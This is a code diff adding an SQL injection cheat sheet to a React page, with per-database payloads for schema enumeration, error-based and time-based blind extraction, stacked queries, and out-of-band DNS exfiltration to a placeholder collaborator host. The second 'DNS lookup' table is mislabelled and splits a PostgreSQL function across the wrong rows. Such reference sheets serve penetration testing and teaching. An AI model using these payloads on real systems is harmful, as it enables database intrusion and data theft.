@@ -338,6 +338,308 @@ const Commends = () => {
 
             <details>
                 <summary>MySQL</summary>
+                <h2>SQL injection cheat sheet</h2>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Injection String concatenation</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>'foo'||'bar'</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>'foo'+'bar'</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>'foo'||'bar'</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>'foo' 'bar' [Note the space between the two strings] CONCAT('foo','bar')</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Substring</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>SUBSTR('foobar', 4, 2)</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>SUBSTRING('foobar', 4, 2)</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>SUBSTRING('foobar', 4, 2)</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>SUBSTRING('foobar', 4, 2)</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Comments</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>--comment</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>--comment /*comment*/</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>--comment /*comment*/</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>#comment -- comment [Note the space after the double dash] /*comment*/</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Database version</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>SELECT banner FROM v$version SELECT version FROM v$instance</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>SELECT @@version</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>SELECT version()</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>SELECT @@version</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Database contents</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>SELECT * FROM all_tables</td>
+                            <td>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>SELECT * FROM information_schema.tables</td>
+                            <td>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>SELECT * FROM information_schema.tables</td>
+                            <td>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>SELECT * FROM information_schema.tables</td>
+                            <td>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Conditional errors</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Extracting data via visible error messages</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>SELECT 'foo' WHERE 1 = (SELECT 'secret') - Conversion failed when converting the varchar value 'secret' to data type int.</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>SELECT CAST((SELECT password FROM users LIMIT 1) AS int) - invalid input syntax for integer: "secret"</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) - XPATH syntax error: '\secret'</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Batched (or stacked) queries</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>Does not support batched queries.</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>QUERY-1-HERE; QUERY-2-HERE   QUERY-1-HERE QUERY-2-HERE</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>QUERY-1-HERE; QUERY-2-HERE</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>QUERY-1-HERE; QUERY-2-HERE</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Time delays</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>dbms_pipe.receive_message(('a'),10)</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>WAITFOR DELAY '0:0:10'</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>SELECT pg_sleep(10)</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>SELECT SLEEP(10)</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Conditional time delays</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>DNS lookup</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>{`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`} **** {`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`}</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a') SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>DNS lookup</th>
+                        </tr>
+                    </thead>
+                    <tbody className='description'>
+                        <tr>
+                            <td>Oracle</td>
+                            <td>{`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`}</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td>{`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`} **** {`create OR replace function f() returns void as $$declare c text;declare p text;begin`}</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>{`SELECT into p (SELECT YOUR-QUERY-HERE);c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';execute c;END;$$ language plpgsql security definer;SELECT f();`}</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</td>
+                        </tr>
+                    </tbody>
+                </table>
+
                 <table>
                     <thead>
                         <tr>
